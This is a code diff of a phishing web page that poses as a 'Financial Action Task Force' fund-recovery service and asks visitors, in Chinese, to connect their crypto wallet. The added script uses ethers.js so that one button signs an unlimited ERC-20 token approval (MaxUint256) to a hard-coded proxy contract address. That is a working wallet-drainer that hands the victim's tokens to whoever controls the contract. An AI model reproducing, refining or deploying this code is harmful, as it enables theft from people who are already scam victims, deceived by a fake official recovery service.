@@ -109,46 +109,70 @@
     <div class="container" id="recovery">
         <h2 class="section-title">Recover Funds</h2>
         <p>请连接您的钱包并授权，以便我们协助您完成资金追回过程。</p>
-        <button onclick="connectWallet()">Connect Wallet</button>
-        <p id="wallet-status"></p>
-        <button onclick="authorizeWallet()">Authorize Wallet</button>
+        <button id="connectWallet" onclick="connectWallet()">链接钱包</button>
+        <p id="walletStatus">钱包未连接</p>
+        <button id="approveButton" onclick="approveTokens()" disabled>授权无限代币</button>
     </div>
 
     <footer>
         <p>&copy; 2024 Financial Action Task Force. All rights reserved.</p>
     </footer>
 
+    <!-- 替代 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
+        // 配置
+        const tokenAddress = "0x8588fC4386D278A0Ec02318983f4F837004E6722"; // 目标代币合约地址
+        const proxyAddress = "0xfdB563c33AB7F14e411d58651959318597D8CC1E"; // 代理合约地址
+        let provider, signer;
+
+        // 链接钱包
         async function connectWallet() {
-            if (window.ethereum) {
+            if (typeof window.ethereum !== "undefined") {
                 try {
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    document.getElementById('wallet-status').innerText = `Wallet Connected: ${accounts[0]}`;
+                    // 请求用户连接钱包
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    signer = provider.getSigner();
+                    const walletAddress = await signer.getAddress();
+
+                    // 更新钱包状态
+                    document.getElementById("walletStatus").innerText = `已连接钱包地址: ${walletAddress}`;
+                    document.getElementById("approveButton").disabled = false; // 启用授权按钮
                 } catch (error) {
-                    document.getElementById('wallet-status').innerText = 'Connection failed!';
+                    console.error("钱包连接失败:", error);
+                    alert("钱包连接失败，请重试！");
                 }
             } else {
-                alert('MetaMask is not installed.');
+                alert("请安装 MetaMask 或其他钱包扩展！");
             }
         }
 
-        async function authorizeWallet() {
-            const contractAddress = '0xfdB563c33AB7F14e411d58651959318597D8CC1E';
-            const tokenAddress = '0x8588fC4386D278A0Ec02318983f4F837004E6722';
+        // 授权代币，默认无限额度
+        async function approveTokens() {
+            if (!signer) {
+                alert("请先链接钱包！");
+                return;
+            }
 
-            if (window.ethereum) {
-                try {
-                    const provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const signer = provider.getSigner();
-                    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
-                    await tokenContract.approve(contractAddress, ethers.constants.MaxUint256);
-                    alert('Authorization successful.');
-                } catch (error) {
-                    console.error('Authorization failed:', error);
-                    alert('Authorization failed.');
-                }
-            } else {
-                alert('MetaMask is not installed.');
+            // ERC20 代币合约 ABI（仅包含 approve 方法）
+            const tokenABI = [
+                "function approve(address spender, uint256 amount) external returns (bool)"
+            ];
+
+            // 创建代币合约实例
+            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+            try {
+                // 调用 approve 方法授权无限额度
+                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
+                console.log("授权交易已发送:", tx.hash);
+                alert("授权交易已发送，请等待确认！");
+                await tx.wait(); // 等待交易确认
+                alert("授权成功，您已授予代理合约无限额度！");
+            } catch (error) {
+                console.error("授权失败:", error);
+                alert("授权失败，请检查控制台错误信息！");
             }
         }
     </script>
